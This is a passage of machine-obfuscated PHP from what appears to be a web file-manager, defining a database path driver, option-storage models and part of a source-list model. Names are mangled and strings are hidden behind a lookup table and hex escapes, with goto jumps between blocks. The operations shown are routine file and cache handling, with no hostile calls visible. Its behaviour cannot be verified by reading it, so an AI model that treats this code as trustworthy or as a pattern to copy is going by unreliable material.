$ğÀóí‘³[219]) { $åÄõ—êğ = $ğÀóí‘³[220] . substr($åÄõ—êğ, 7); } header($ğÀóí‘³[175] . $åÄõ—êğ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($íäš³„Û) { $this->pathParse = $íäš³„Û; $this->model = Model($_SERVER[‹‰”››ê][1437]); } public function getPath($İ§òÓö…) { return trim($İ§òÓö…, $_SERVER[‹‰”››ê][8]); } public function pathFather($óŞœ‘) { $–ˆŸÂÌü = $this->parse($óŞœ‘); $–ˆŸÂÌü = $this->infoSimple($óŞœ‘); return $–ˆŸÂÌü ? $–ˆŸÂÌü[$_SERVER[‹‰”››ê][193]] : !1; } public function pathThis($ºÈĞáŒ²) { $‚´­ò²¶ = $this->infoSimple($ºÈĞáŒ²); return $‚´­ò²¶ ? $‚´­ò²¶[$_SERVER[‹‰”››ê][32]] : !1; } public function getPathOuter($İ¯²Šò) { if (!$İ¯²Šò) { return $İ¯²Šò; } $¤Åä³¾ê = $this->parse($İ¯²Šò); return KodIO::make($¤Åä³¾ê[$_SERVER[‹‰”››ê][487]]); } public function copyFolderFromIO($ûõµİÂş, $Ë©üÚøÍ, $›ÈğòÇØ, $²îüü¦, $¯ÍÏ) { $…·ƒœš‡ = $this->model->copyFolderFromIO($ûõµİÂş, $Ë©üÚøÍ, $›ÈğòÇØ, $²îüü¦, $¯ÍÏ); return KodIO::make($…·ƒœš‡); } public function isParentOf($ªîµ†ñœ, $şÄãŞİ) { return $this->model->isParentOf($ªîµ†ñœ, $şÄãŞİ); } public function mkfile($®Š§ôİ, $û°Š…Š = '', $øÕìÀ¤ì = REPEAT_RENAME) { $‹Ã¿¬§ô =& $_SERVER[‹‰”››ê]; $„ÜáóßĞ = $this->parse($®Š§ôİ); $®Š§ôİ = $„ÜáóßĞ[$‹Ã¿¬§ô[487]]; for ($«öˆÂßº = 0; $«öˆÂßº < count($„ÜáóßĞ[$‹Ã¿¬§ô[1438]]); $«öˆÂßº++) { $˜éÖôÖ‰ = $„ÜáóßĞ[$‹Ã¿¬§ô[1438]][$«öˆÂßº]; if ($«öˆÂßº == count($„ÜáóßĞ[$‹Ã¿¬§ô[1438]]) - 1) { $®Š§ôİ = $this->model->mkfile($®Š§ôİ, $˜éÖôÖ‰, $û°Š…Š, $øÕìÀ¤ì); break; } $®Š§ôİ = $this->model->mkdir($®Š§ôİ, $˜éÖôÖ‰, REPEAT_SKIP); } return $this->getPathOuter($®Š§ôİ); } public function mkdir($ıë¤³Šı, $Ø—ûÓÑ¢ = REPEAT_SKIP) { $ãš§«¼˜ =& $_SERVER[‹‰”››ê]; $ ’ÂŠüØ = $this->parse($ıë¤³Šı); $ıë¤³Šı = $ ’ÂŠüØ[$ãš§«¼˜[487]]; for ($¡œ‹ê°’ = 0; $¡œ‹ê°’ < count($ ’ÂŠüØ[$ãš§«¼˜[1438]]); $¡œ‹ê°’++) { $—ªÓš·í = $ ’ÂŠüØ[$ãš§«¼˜[1438]][$¡œ‹ê°’]; $ıë¤³Šı = $this->model->mkdir($ıë¤³Šı, $—ªÓš·í, $Ø—ûÓÑ¢); } return $this->getPathOuter($ıë¤³Šı); } public function copyFile($Ú®´ÉÎë, $´±ÅèÌ, $Ï ñ¡ç© = REPEAT_REPLACE) { $Â¸«½°¿ =& $_SERVER[‹‰”››ê]; $¬‹éüó« = $this->parse($´±ÅèÌ); $Š…³²Ûâ = $this->model->copy($Ú®´ÉÎë, $¬‹éüó«[$Â¸«½°¿[487]], $Ï ñ¡ç©, $¬‹éüó«[$Â¸«½°¿[87]]); return $Š…³²Ûâ ? $this->getPathOuter($Š…³²Ûâ) : !1; } public function moveFile($¼¶Ÿüİç, $ãğÇ´û•, $øá»×ˆí = REPEAT_REPLACE) { $ì«‰õŒ† =& $_SERVER[‹‰”››ê]; $šŒœŸò = $this->parse($ãğÇ´û•); $æ£ƒ““Â = $this->model->move($¼¶Ÿüİç, $šŒœŸò[$ì«‰õŒ†[487]], $øá»×ˆí, $šŒœŸò[$ì«‰õŒ†[87]]); return $æ£ƒ““Â ? $this->getPathOuter($æ£ƒ““Â) : !1; } public function copy($ïÚœ‚é”, $–À­ÍÍ, $Ã¿áŞŠ„ = REPEAT_REPLACE, $€óÒªİÑ = false) { $³ÓìÛîÍ = $this->parse($–À­ÍÍ); $ßßñ¨ÇŸ = $this->model->copy($ïÚœ‚é”, $³ÓìÛîÍ[$_SERVER[‹‰”››ê][487]], $Ã¿áŞŠ„, $€óÒªİÑ); return $ßßñ¨ÇŸ ? $this->getPathOuter($ßßñ¨ÇŸ) : !1; } public function moveSameAllow() { } public function move($¨á–±ò–, $è‹À®ûò, $—¥Å… = REPEAT_REPLACE, $ºÌİÍÁ¡ = false) { $Ü‘ºƒ§— = $this->parse($è‹À®ûò); $ó÷ÔÖ½ = $this->model->move($¨á–±ò–, $Ü‘ºƒ§—[$_SERVER[‹‰”››ê][487]], $—¥Å…, $ºÌİÍÁ¡); return $ó÷ÔÖ½ ? $this->getPathOuter($ó÷ÔÖ½) : !1; } public function remove($•±®âçŸ, $¬Õßê›¥ = true) { return $this->model->remove($•±®âçŸ, $¬Õßê›¥); } public function rename($¡õİÑÎÖ, $›‘µ¹§‰) { $ÀÚø¸ = $this->model->rename($¡õİÑÎÖ, $›‘µ¹§‰); return $ÀÚø¸ ? $this->getPathOuter($¡õİÑÎÖ) : $ÀÚø¸; } public function size($ˆˆ•˜¿) { $¼—Ğ¡ù = $this->infoSimple($ˆˆ•˜¿); return $¼—Ğ¡ù ? $¼—Ğ¡ù[$_SERVER[‹‰”››ê][79]] : 0; } public function infoSimple($¹´ù£© ) { return $this->model->sourceInfo($¹´ù£© ); } public function info($âš£Öë¿) { return $this->infoParse($âš£Öë¿); } public function infoAuth($°ºúô…) { return $this->infoParse($°ºúô…, !1, !0); } public function infoWithChildren($¶ÔÃÊ») { return $this->infoParse($¶ÔÃÊ», !0); } protected function infoParse($èÃ¸»ÚŞ, $Ò·§Â¡Ñ = false, $‡â€óŠ– = false) { if (!$Ò·§Â¡Ñ) { return $this->model->pathInfo($èÃ¸»ÚŞ, $‡â€óŠ–); } return $this->model->pathInfoMore($èÃ¸»ÚŞ); } public function infoFullSimple($íÕ¯ÊŒ•) { $¦ÚÒ”Ğè =& $_SERVER[‹‰”››ê]; $Æ•â¶©– = explode($¦ÚÒ”Ğè[8], $íÕ¯ÊŒ•); $‰äá‚Ş³ = implode($¦ÚÒ”Ğè[8], array_splice($Æ•â¶©–, 1)); return $this->model->pathInfoByPath($Æ•â¶©–[0], $‰äá‚Ş³); } public function infoFull($¶³ÁîÑÎ) { $ÌÚÄÃø© = $this->infoFullSimple($¶³ÁîÑÎ); return is_array($ÌÚÄÃø©) ? $this->model->pathInfo($ÌÚÄÃø©[$_SERVER[‹‰”››ê][194]]) : !1; } public function hashSimple($¥ã”“ø) { $±Ûƒ‚ØÏ =& $_SERVER[‹‰”››ê]; $ûÜ‘İîò = $this->infoWithChildren($¥ã”“ø); return $ûÜ‘İîò[$±Ûƒ‚ØÏ[170]][$±Ûƒ‚ØÏ[689]]; } public function hashMd5($ã´„şËô) { $ä¯´Ì =& $_SERVER[‹‰”››ê]; $Æš‹ı¹Í = $this->infoWithChildren($ã´„şËô); return $Æš‹ı¹Í[$ä¯´Ì[170]][$ä¯´Ì[561]]; } public function exist($ˆä¢‹Ê) { $¾ú‡åêÑ =& $_SERVER[‹‰”››ê]; $¿¬ĞÑÕ = $this->parse($ˆä¢‹Ê); if (!$¿¬ĞÑÕ[$¾ú‡åêÑ[87]]) { return $this->isFile($ˆä¢‹Ê) || $this->isFolder($ˆä¢‹Ê); } $„Ô™Ó¹ = array($¾ú‡åêÑ[489] => $¿¬ĞÑÕ[$¾ú‡åêÑ[487]], $¾ú‡åêÑ[32] => $¿¬ĞÑÕ[$¾ú‡åêÑ[87]]); $Ú•‚Ô¦® = $this->model->where($„Ô™Ó¹)->find(); return $Ú•‚Ô¦® ? !0 : !1; } public function isFile($ÆÖÂªĞæ) { $ˆ£ÑİŒ =& $_SERVER[‹‰”››ê]; $æÖÀå£ƒ = $this->infoSimple($ÆÖÂªĞæ); return $æÖÀå£ƒ && $æÖÀå£ƒ[$ˆ£ÑİŒ[497]] == $ˆ£ÑİŒ[231] ? !0 : !1; } public function isFolder($¢ó»ëò’) { $ã¹©›¥› =& $_SERVER[‹‰”››ê]; $ê˜Â­¶Œ = $this->infoSimple($¢ó»ëò’); return $ê˜Â­¶Œ && $ê˜Â­¶Œ[$ã¹©›¥›[497]] == $ã¹©›¥›[91] ? !0 : !1; } public function listPath($Ñòê®¡, $©¶¨±‹´ = false) { $§÷ü¦È =& $_SERVER[‹‰”››ê]; if ($Ñòê®¡ == $§÷ü¦È[12]) { return !1; } $ÅÔí‰¯« = array($§÷ü¦È[489] => $Ñòê®¡); if ($©¶¨±‹´) { return $this->model->listSource($ÅÔí‰¯«, -1); } return $this->model->listSource($ÅÔí‰¯«); } public function has($Èª‚Ø·, $ƒôÒ±Øâ = false, $Ö—ÊÍÒØ = null) { $ÒØ–‚’Í =& $_SERVER[‹‰”››ê]; $ı›×“ğ = $this->infoWithChildren($Èª‚Ø·); if ($ƒôÒ±Øâ) { return array($ÒØ–‚’Í[243] => $ı›×“ğ[$ÒØ–‚’Í[243]], $ÒØ–‚’Í[242] => $ı›×“ğ[$ÒØ–‚’Í[242]]); } return $Ö—ÊÍÒØ ? $ı›×“ğ[$ÒØ–‚’Í[243]] : $ı›×“ğ[$ÒØ–‚’Í[242]]; } public function listAll($±Øä½Ğ£) { $‰òï¨»› = IO::info($this->pathParse[$_SERVER[‹‰”››ê][87]]); if (!$‰òï¨»›) { return array(); } return $this->model->listAll($±Øä½Ğ£); } public function getContent($’‚ºëÊÛ) { return $this->model->getContent($’‚ºëÊÛ); } public function setContent($‡¡·»¼æ, $ƒõÌæ‹ = '') { return $this->model->setContent($‡¡·»¼æ, $ƒõÌæ‹); } public function fileSubstr($§›´é¤Ğ, $‡Æ€ êê, $ÀßÕ”¬«) { return $this->model->fileSubstr($§›´é¤Ğ, $‡Æ€ êê, $ÀßÕ”¬«); } public function download($áŒ’ı‰Ü, $ë‹´˜Ù = '') { $—ÓÏ¹‹¸ = get_path_father($ë‹´˜Ù); $°ƒÍœ•ø = get_path_this($ë‹´˜Ù); $‹ğØÛš = $this->model->fileInfoGet($áŒ’ı‰Ü); $–Œ×º‘Ü = IO::copy($‹ğØÛš[$_SERVER[‹‰”››ê][87]], $—ÓÏ¹‹¸, !1, $°ƒÍœ•ø); return $–Œ×º‘Ü; } public function setModifyTime($°ÑÂ³ëÇ, $—ËæÀÉ÷ = '') { $Õ£·¤èÕ =& $_SERVER[‹‰”››ê]; if (!$°ÑÂ³ëÇ) { return; } $this->model->where(array($Õ£·¤èÕ[503] => $°ÑÂ³ëÇ))->save(array($Õ£·¤èÕ[88] => $—ËæÀÉ÷)); } public function upload($íÄ¦ç‹Ø, $›Ì³‹˜Å, $¨Í™Å×Ñ = false, $ñÛÜ¹ƒ¬ = REPEAT_REPLACE) { $­ÜØŠí° =& $_SERVER[‹‰”››ê]; $°šË¤Î¶ = $this->parse($íÄ¦ç‹Ø); $ó¬ğô†± = $this->model->addFile($°šË¤Î¶[$­ÜØŠí°[487]], $›Ì³‹˜Å, $°šË¤Î¶[$­ÜØŠí°[87]], $¨Í™Å×Ñ, $ñÛÜ¹ƒ¬); return $this->getPathOuter($ó¬ğô†±); } public function uploadFileByID($ÃÍµ€…ƒ, $ìÃê°ğŠ, $Œ´•ÃøÁ) { $Ô“×Á¨Ö =& $_SERVER[‹‰”››ê]; $Í¸åîøù = $this->parse($ÃÍµ€…ƒ); $À¶ß¡Ãù = $this->model->addFileByFileID($Í¸åîøù[$Ô“×Á¨Ö[487]], $ìÃê°ğŠ, $Í¸åîøù[$Ô“×Á¨Ö[87]], $Œ´•ÃøÁ); return $this->getPathOuter($À¶ß¡Ãù); } public function addFileByRemote($‘–¯Ë¼, $ˆ„Â÷™×, $å±èŞáÔ = array(), $Ñ°º¥ú† = '', $Á¬¶œº) { $‹ Äæ²ú =& $_SERVER[‹‰”››ê]; $´‘ø¯¦Œ = $this->parse($‘–¯Ë¼); $Ñ°º¥ú† = empty($Ñ°º¥ú†) ? $´‘ø¯¦Œ[$‹ Äæ²ú[87]] : $Ñ°º¥ú†; $Æ¦Î¼şÓ = $this->model->addFileByRemote($´‘ø¯¦Œ[$‹ Äæ²ú[487]], $ˆ„Â÷™×, $Ñ°º¥ú†, $å±èŞáÔ, $Á¬¶œº); return $this->getPathOuter($Æ¦Î¼şÓ); } public function uploadLink($ñã•ãÚÀ, $¨ºÄà‰Ò = 0) { $‹ö·’‡ş =& $_SERVER[‹‰”››ê]; $º¢õ¤Ş = $this->parse($ñã•ãÚÀ); $«òö¸· = _get($GLOBALS[$‹ö·’‡ş[7]], $‹ö·’‡ş[1439]); $µ†æâèŠ = _get($GLOBALS[$‹ö·’‡ş[7]], $‹ö·’‡ş[1440]); $ñã•ãÚÀ = Model($‹ö·’‡ş[691])->createFileName($º¢õ¤Ş[$‹ö·’‡ş[87]], $«òö¸·, $µ†æâèŠ); return IO::uploadLink($ñã•ãÚÀ, $¨ºÄà‰Ò); } public function fileNameAuto($Ø²ïÄæ£, $–îõÎİ, $“™Êİîä = REPEAT_REPLACE, $ñ±…“™Š = false) { return $this->model->fileNameAuto($Ø²ïÄæ£, $–îõÎİ, $“™Êİîä, $ñ±…“™Š); } public function fileNameExist($ü‰‚à‰è, $ºéØê­”) { return $this->model->fileNameExist($ü‰‚à‰è, $ºéØê­”); } protected function _fileOut($ÔÔŠŠˆ, $”…Ÿâ º = false, $ß¢ì‰á = false, $ö¾Ğ‡–Ğ = '', $ö¦‹ö¹˜ = false) { $ê¹“Œ’Ö =& $_SERVER[‹‰”››ê]; $ìşÍåâ¢ = $this->model->sourceInfo($ÔÔŠŠˆ); if ($ìşÍåâ¢[$ê¹“Œ’Ö[497]] == $ê¹“Œ’Ö[91]) { header($ê¹“Œ’Ö[1441]); die; } $‡–¼’•È = $this->model->fileInfoGet($ÔÔŠŠˆ); $ö¾Ğ‡–Ğ = $‡–¼’•È[$ê¹“Œ’Ö[561]] ? $‡–¼’•È[$ê¹“Œ’Ö[561]] : $ö¾Ğ‡–Ğ; $Ó¨ö«Ú = isset($GLOBALS[$ê¹“Œ’Ö[183]]) && is_array($GLOBALS[$ê¹“Œ’Ö[183]]) ? $GLOBALS[$ê¹“Œ’Ö[183]][$ê¹“Œ’Ö[32]] : $ìşÍåâ¢[$ê¹“Œ’Ö[32]]; if ($ö¦‹ö¹˜) { return IO::fileOutServer($‡–¼’•È[$ê¹“Œ’Ö[87]], $”…Ÿâ º, $Ó¨ö«Ú, $ö¾Ğ‡–Ğ); } IO::fileOut($‡–¼’•È[$ê¹“Œ’Ö[87]], $”…Ÿâ º, $Ó¨ö«Ú, $ö¾Ğ‡–Ğ); } public function fileOut($íˆÇö¬ë, $™ûê‘úÊ = false, $–çÀº‡Ÿ = false, $Ÿè¤ğ¸ä = '') { $this->_fileOut($íˆÇö¬ë, $™ûê‘úÊ, $–çÀº‡Ÿ, $Ÿè¤ğ¸ä); } public function fileOutServer($ÄòŸ¤æÌ, $Ğ¹òØå° = false, $ÎÙ¼“ª½ = false, $ Ù„µ¶ = '') { $this->_fileOut($ÄòŸ¤æÌ, $Ğ¹òØå°, $ÎÙ¼“ª½, $ Ù„µ¶, !0); } protected function _fileOutImage($Ÿâùüì¨, $Æ†ëêŠ¿ = 250) { $ŸŠß‚ØÔ =& $_SERVER[‹‰”››ê]; $Ëäà‘ˆø = $this->model->pathInfo($Ÿâùüì¨); if ($Ëäà‘ˆø[$ŸŠß‚ØÔ[497]] == $ŸŠß‚ØÔ[91]) { show_json($ŸŠß‚ØÔ[1442] . $Ÿâùüì¨, !1); } $µºŸÄ¹® = $this->model->fileInfoGet($Ÿâùüì¨); $Ëäà‘ˆø[$ŸŠß‚ØÔ[184]] = $µºŸÄ¹®[$ŸŠß‚ØÔ[87]]; $GLOBALS[$ŸŠß‚ØÔ[183]] = $Ëäà‘ˆø; IO::fileOutImage($µºŸÄ¹®[$ŸŠß‚ØÔ[87]], $Æ†ëêŠ¿); } public function fileOutImage($õ„Ï„ø¸, $Úï†ğÀÙ = 250) { $this->_fileOutImage($õ„Ï„ø¸, $Úï†ğÀÙ); } public function fileOutImageServer($ˆíÆĞ˜, $àğæÂ = 250) { $this->_fileOutImage($ˆíÆĞ˜, $àğæÂ); } public function link($»¨œíÊ×, $µâÕ»ø‚ = '') { $†ŸÉ‰÷Š = $this->model->fileInfoGet($»¨œíÊ×); return IO::link($†ŸÉ‰÷Š[$_SERVER[‹‰”››ê][87]], $µâÕ»ø‚); } protected function parse($¤Ø„Ù¾ç) { $Ä¼ŞÀ =& $_SERVER[‹‰”››ê]; if (strstr($¤Ø„Ù¾ç, $Ä¼ŞÀ[8]) === !1) { return array($Ä¼ŞÀ[505] => intval($¤Ø„Ù¾ç), $Ä¼ŞÀ[87] => $Ä¼ŞÀ[12], $Ä¼ŞÀ[1438] => array()); } $Ÿõ—ÎŠ = explode($Ä¼ŞÀ[8], trim($¤Ø„Ù¾ç, $Ä¼ŞÀ[8])); if (count($Ÿõ—ÎŠ) < 2) { show_tips(clear_html($¤Ø„Ù¾ç) . $Ä¼ŞÀ[1443]); } return array($Ä¼ŞÀ[505] => intval($Ÿõ—ÎŠ[0]), $Ä¼ŞÀ[87] => $Ÿõ—ÎŠ[1], $Ä¼ŞÀ[1438] => array_slice($Ÿõ—ÎŠ, 1)); } } goto AƒÈ²ÉŸÙ; f¥õùòã¸è: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\145\x6d\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($³Ùò¡ä€ = false, $İŸµÛÃ = "\x6d\x6f\144\151\146\171\x54\151\155\145", $±‹ªªëá = false) { $ëæ©“†Ù = Model($this->modelType)->get(!1, $this->optionType, !0); $”¥¥»áÂ = array_values($ëæ©“†Ù); if ($”¥¥»áÂ && $”¥¥»áÂ[0] && !is_array($”¥¥»áÂ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ëæ©“†Ù = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ëæ©“†Ù) { return $³Ùò¡ä€ ? null : array(); } if (!$³Ùò¡ä€) { $ëæ©“†Ù = array_filter(array_values($ëæ©“†Ù)); return array_sort_by($ëæ©“†Ù, $İŸµÛÃ, $±‹ªªëá); } return $ëæ©“†Ù[$_SERVER[‹‰”››ê][484] . $³Ùò¡ä€]; } public function insert($î½İù‰Ÿ) { $Ğ·Î³™½ =& $_SERVER[‹‰”››ê]; $î½İù‰Ÿ = array_field_key($î½İù‰Ÿ, $this->field); $•Á¿Í— = Model($this->modelType)->get($Ğ·Î³™½[485], $this->optionType . $Ğ·Î³™½[486]); $•Á¿Í— = $•Á¿Í— ? $•Á¿Í— : 0; $î½İù‰Ÿ[$Ğ·Î³™½[487]] = ++$•Á¿Í—; $î½İù‰Ÿ[$Ğ·Î³™½[234]] = time(); $î½İù‰Ÿ[$Ğ·Î³™½[88]] = time(); Model($this->modelType)->set($Ğ·Î³™½[485], $•Á¿Í—, $this->optionType . $Ğ·Î³™½[486]); Model($this->modelType)->set($Ğ·Î³™½[484] . $•Á¿Í—, $î½İù‰Ÿ, $this->optionType); return $•Á¿Í—; } public function update($Äâ²àºà, $«î”»ÉŞ) { $ßïÍûáğ =& $_SERVER[‹‰”››ê]; $«î”»ÉŞ = array_field_key($«î”»ÉŞ, $this->field); $¦‹’‚¥É = $this->listData($Äâ²àºà); if (!$¦‹’‚¥É || !$Äâ²àºà) { return !1; } $«î”»ÉŞ = array_merge($¦‹’‚¥É, $«î”»ÉŞ); $«î”»ÉŞ[$ßïÍûáğ[88]] = time(); return Model($this->modelType)->set($ßïÍûáğ[484] . $Äâ²àºà, $«î”»ÉŞ, $this->optionType); } public function remove($ØØü½ğ¯) { if (!$ØØü½ğ¯) { return !1; } return Model($this->modelType)->remove($_SERVER[‹‰”››ê][484] . $ØØü½ğ¯, $this->optionType); } public function clear() { $¢ğïÜø• =& $_SERVER[‹‰”››ê]; Model($this->modelType)->remove($¢ğïÜø•[485], $this->optionType . $¢ğïÜø•[486]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($‚¸Â½¹ğ, $ŸÓâ¨’) { if (!$ŸÓâ¨’) { return !1; } $’Ñş‡˜Œ = $this->listData(); $’Ñş‡˜Œ = array_to_keyvalue($’Ñş‡˜Œ, $‚¸Â½¹ğ); return isset($’Ñş‡˜Œ[$ŸÓâ¨’]) ? $’Ñş‡˜Œ[$ŸÓâ¨’] : !1; } public function findByName($ÈÂ¼ÎŞƒ) { return $this->findByKey($_SERVER[‹‰”››ê][32], $ÈÂ¼ÎŞƒ); } protected function resetData($²Ğ‘úâº) { $™ÁÑ£ñ× =& $_SERVER[‹‰”››ê]; $²Ğ‘úâº = is_array($²Ğ‘úâº) ? $²Ğ‘úâº : array(); $˜…Öèƒ„ = array(); for ($¢‰¿æ˜¯ = 0; $¢‰¿æ˜¯ < count($²Ğ‘úâº); $¢‰¿æ˜¯++) { $˜…Öèƒ„[$™ÁÑ£ñ×[484] . $²Ğ‘úâº[$¢‰¿æ˜¯][$™ÁÑ£ñ×[487]]] = $²Ğ‘úâº[$¢‰¿æ˜¯]; } return Model($this->modelType)->set($˜…Öèƒ„, !1, $this->optionType); } private function getAutoName($ºøÄˆŞ‚) { $í¾˜Ğß = array_to_keyvalue($this->listData(), $_SERVER[‹‰”››ê][32]); if (!$í¾˜Ğß || !isset($í¾˜Ğß[$ºøÄˆŞ‚])) { return $ºøÄˆŞ‚; } for ($Ğ–Òî¬ = 1; $Ğ–Òî¬ < count($í¾˜Ğß); $Ğ–Òî¬++) { $¾İˆ§ƒ = $ºøÄˆŞ‚ . "\50{$Ğ–Òî¬}\51"; if (!isset($í¾˜Ğß[$¾İˆ§ƒ])) { return $¾İˆ§ƒ; } } return $¾İˆ§ƒ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($±•ä¸’ı = false, $Ìáœƒ¦ = '', $¬¸´‡¤â = false) { $ª›×ØøÉ =& $_SERVER[‹‰”››ê]; $‚ÊÎ½³¸ = $this->cacheGet($Ìáœƒ¦); $ãĞ˜®¥ç = $this->optionDefault($Ìáœƒ¦); $ãĞ˜®¥ç = is_array($ãĞ˜®¥ç) ? $ãĞ˜®¥ç : array(); if (is_array($‚ÊÎ½³¸)) { $‚ÊÎ½³¸ = array_merge($ãĞ˜®¥ç, $‚ÊÎ½³¸); return $±•ä¸’ı ? isset($‚ÊÎ½³¸[$±•ä¸’ı]) ? $‚ÊÎ½³¸[$±•ä¸’ı] : null : $‚ÊÎ½³¸; } $“¤’÷É = $this->filterWhere(array($ª›×ØøÉ[33] => $Ìáœƒ¦)); $‚ÊÎ½³¸ = $this->where($“¤’÷É)->select(); $‚ÊÎ½³¸ = array_to_keyvalue($‚ÊÎ½³¸, $ª›×ØøÉ[97], $ª›×ØøÉ[462]); foreach ($‚ÊÎ½³¸ as $”¸Öİò => $äøêƒÖÛ) { if ($¬¸´‡¤â || in_array($”¸Öİò, $this->jsonField)) { $‚ÊÎ½³¸[$”¸Öİò] = json_decode($äøêƒÖÛ, !0); } } $this->cacheSet($Ìáœƒ¦, $‚ÊÎ½³¸); $‚ÊÎ½³¸ = array_merge($ãĞ˜®¥ç, $‚ÊÎ½³¸); return $±•ä¸’ı ? $‚ÊÎ½³¸[$±•ä¸’ı] : $‚ÊÎ½³¸; } public function set($¾¢şúˆ‡, $’é–„ƒ» = false, $¼¥æÍû‹ = '') { $µ´ãÍô =& $_SERVER[‹‰”››ê]; $this->cacheRemove($¼¥æÍû‹); $¹´àÂê = array(); $¡’ƒúç” = is_array($¾¢şúˆ‡) ? $¾¢şúˆ‡ : array($¾¢şúˆ‡ => $’é–„ƒ»); foreach ($¡’ƒúç” as $«¸¯¤Æ => $‹¤Ğ”¹) { if (is_array($‹¤Ğ”¹)) { $‹¤Ğ”¹ = json_encode_force($‹¤Ğ”¹); } $this->checkLength($‹¤Ğ”¹, !1, $this->tableName . $µ´ãÍô[4] . $¾¢şúˆ‡); $‹¤Ğ”¹ = self::textEncode($‹¤Ğ”¹); $¡’ƒúç” = array($µ´ãÍô[33] => $¼¥æÍû‹, $µ´ãÍô[97] => $«¸¯¤Æ, $µ´ãÍô[462] => $‹¤Ğ”¹); $¹´àÂê[] = $this->filterWhere($¡’ƒúç”); } if (!$¹´àÂê) { return !0; } $é¤ˆÅ¬ = $this->cacheKey($µ´ãÍô[488]); CacheLock::lock($é¤ˆÅ¬); $×Ø°ßèÚ = $this->addAll($¹´àÂê, array(), !0); CacheLock::unlock($é¤ˆÅ¬); return $×Ø°ßèÚ; } protected function optionDefault($—ÔãÆ ” = '') { return !1; } public function setDeep($ûşñÎ, $ğøÈìÓ– = false, $ù¥âì„ê = '') { $™ç›±€Ö = explode($_SERVER[‹‰”››ê][10], $ûşñÎ); $³ÔğÚàŠ = $this->get(); array_set_value($³ÔğÚàŠ, $ûşñÎ, $ğøÈìÓ–); $this->set($™ç›±€Ö[0], $³ÔğÚàŠ[$™ç›±€Ö[0]], $ù¥âì„ê); } public function remove($›»“‘³, $Ìğ—úİØ = '') { $¯ìëİÆñ =& $_SERVER[‹‰”››ê]; $this->cacheRemove($Ìğ—úİØ); $å¼±º¦Ô = $this->filterWhere(array($¯ìëİÆñ[97] => $›»“‘³, $¯ìëİÆñ[33] => $Ìğ—úİØ)); if (is_null($›»“‘³)) { unset($å¼±º¦Ô[$¯ìëİÆñ[97]]); } return $this->where($å¼±º¦Ô)->delete(); } public function cacheSet($šÎ¬—­, $åº ÊºÉ = false) { return Cache::set($this->cacheKey($šÎ¬—­), $åº ÊºÉ); } public function cacheGet($Ô‰“Ô¬­) { return Cache::get($this->cacheKey($Ô‰“Ô¬­)); } public function cacheRemove($¦Åºññ) { return Cache::remove($this->cacheKey($¦Åºññ)); } protected function filterWhere($œ®¢êÇÕ) { return $œ®¢êÇÕ; } protected function cacheKey($­óà“ª) { return $­óà“ª; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\162\x63\x65"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\151\x6f\x5f\x73\x6f\165\162\x63\x65\x5f\155\145\x74\141", "\x6d\145\x74\141\106\151\x65\154\144" => "\x73\x6f\x75\162\143\x65\x49\104"); protected $dataAuto = array(array("\155\157\144\151\146\171\x54\151\155\145", "\x74\x69\155\x65", "\151\156\163\x65\x72\164", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\x63\162\145\x61\x74\x65\124\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\162\164", "\146\x75\156\143\x74\151\x6f\x6e"), array("\x76\x69\x65\167\x54\151\x6d\x65", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($µ™‚å¨Ô) { return $this->listSource(array($_SERVER[‹‰”››ê][489] => $µ™‚å¨Ô)); } public function typeName($±ğ¥•µ) { static $Ü®áá­ú = array(self::TYPE_SYSTEM => "\163\x79\x73\164\145\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\162\x6f\165\x70"); return $Ü®áá­ú[$±ğ¥•µ . $_SERVER[‹‰”››ê][12]]; } public function sourceListInfo($ ¿É”ÚÅ, $ÙéÄ´ù = false) { $şÀ²±¨ =& $_SERVER[‹‰”››ê]; $ ¿É”ÚÅ = $ ¿É”ÚÅ ? $ ¿É”ÚÅ : array(); $ ¿É”ÚÅ = array_filter(array_unique($ ¿É”ÚÅ)); if (!$ ¿É”ÚÅ) { return array(); } $‡©Üõ³ = $this->where(array($şÀ²±¨[194] => array($şÀ²±¨[7], $ ¿É”ÚÅ)))->select(); $this->_listDataApply($‡©Üõ³, $ÙéÄ´ù); return array_to_keyvalue($‡©Üõ³, $şÀ²±¨[194]); } public function pathInfoFilter(&$Âƒ·—á) { $ûÚç‡Å =& $_SERVER[‹‰”››ê]; static $ŠßÊØÎù = false; static $İÕ¥À¬³ = false; static $’ú¥¡¿ = false; if (!$ŠßÊØÎù) { $Ê¬¯óö = $ûÚç‡Å[490]; $Ê¬¯óö .= $ûÚç‡Å[491]; $Ê¬¯óö .= $ûÚç‡Å[492]; $ÖÂçµÚº = $ûÚç‡Å[493]; $Ù”×áÂü = explode($ûÚç‡Å[50], $ÖÂçµÚº); $ŠßÊØÎù = explode($ûÚç‡Å[50], $Ê¬¯óö); $İÕ¥À¬³ = array(); foreach ($ŠßÊØÎù as $üºÃşĞ¡) { if (in_array($üºÃşĞ¡, $Ù”×áÂü)) { continue; } $İÕ¥À¬³[] = $üºÃşĞ¡; } $’ú¥¡¿ = explode($ûÚç‡Å[50], $ûÚç‡Å[494]); } foreach ($’ú¥¡¿ as $‰¯’ÒÄ¯) { if (isset($Âƒ·—á[$‰¯’ÒÄ¯])) { $Âƒ·—á[$‰¯’ÒÄ¯] = intval($Âƒ·—á[$‰¯’ÒÄ¯]); } } $Âƒ·—á[$ûÚç‡Å[87]] = $ûÚç‡Å[495] . $Âƒ·—á[$ûÚç‡Å[194]] . $ûÚç‡Å[496]; $Âƒ·—á[$ûÚç‡Å[33]] = 